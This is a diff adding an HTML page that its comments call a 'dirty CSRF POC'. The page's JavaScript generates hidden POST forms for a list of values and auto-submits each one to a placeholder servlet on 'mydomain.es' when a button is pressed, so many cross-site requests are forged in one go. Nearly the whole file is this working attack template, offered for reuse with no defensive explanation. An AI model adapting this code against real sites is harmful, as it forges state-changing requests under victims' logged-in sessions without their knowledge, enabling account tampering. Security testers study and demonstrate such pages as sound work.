@@ -1,0 +1,25 @@
+<html>
+<!-- My dirty CSRF POC for doing multiple POST requests. Iex: if you need to download/change multiple values in a unique request -->
+<!-- Using a simple array to pass arguments to one variable -->
+<head>
+<meta name="author" content="0xVIC" />
+<script language="Javascript">
+<!--
+function create_myArray() {
+var myArray = ["value1", "value2", "value3"];
+var i;
+for (i = 0; i < myArray.length ; i += 1) {
+  document.body.innerHTML += '<form id='+ myArray[i] +' target="_blank" action="http://mydomain.es/web/someServlet" method="post"><input type="hidden" name="param1" value='+ myArray[i] +'><input type="hidden" name="param2" value="something" /><input type="submit" value="Submit request" /></form>';
+	document.getElementById(myArray[i]).submit();
+  }
+}
+-->
+</script>
+
+</head>
+<body>
+<form name="myForm" method="POST">
+<INPUT type="button" value="PoC_CSRF_L1k0R" name=name onclick="create_myArray();" />
+</form>
+</body>
+</html>
